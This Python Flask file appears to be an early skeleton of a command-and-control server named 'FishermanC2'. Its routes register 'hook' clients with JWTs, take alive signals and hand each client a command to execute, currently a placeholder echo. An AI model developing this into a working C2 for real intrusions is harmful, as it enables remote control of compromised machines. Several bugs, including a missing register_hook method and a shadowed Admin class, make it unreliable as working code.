from flask import Flask, jsonify
from flask_jwt_extended import create_access_token
from flask_admin import Admin
from app.views.admin import MyAdminIndexView, HookModelView
from flask_sqlalchemy import SQLAlchemy
import flask_login as login
from datetime import datetime
import dotenv

dotenv.load_dotenv()

app = Flask(__name__)
app.config.from_pyfile("config.py")


admin = Admin(app, name="Fisherman's Boat", template_mode='bootstrap3', index_view=MyAdminIndexView())

db = SQLAlchemy()
db.init_app(app)

with app.app_context():
    db.create_all()

class Hook(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    last_update = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def __repr__(self):
        return f'<Hook {self.id}>'

class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    login = db.Column(db.String(80), unique=True)
    password = db.Column(db.String(64))

    @property
    def is_authenticated(self):
        return True

    @property
    def is_active(self):
        return True

    @property
    def is_anonymous(self):
        return False

    def get_id(self):
        return self.id

    # Required for administrative interface
    def __unicode__(self):
        return self.username


admin.add_view(HookModelView(Hook, db.session))

login_manager = login.LoginManager()
login_manager.init_app(app)

# Create user loader function
@login_manager.user_loader
def load_user(user_id):
    return db.session.query(Admin).get(user_id)

@app.route('/')
def index():
    return '<h1>FishermanC2</h1>'


@app.route('/hook')
def hook():
    access_token = create_access_token(identity=str(db.register_hook()))
    return jsonify(access_token=access_token)


@app.route('/alive', methods=['GET'])
def alive():
    app.logger.info(f'Got alive signal')
    return 'ok', 200


@app.route('/command', methods=['POST'])
def bait():
    return jsonify(command='echo "Hello World"')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)



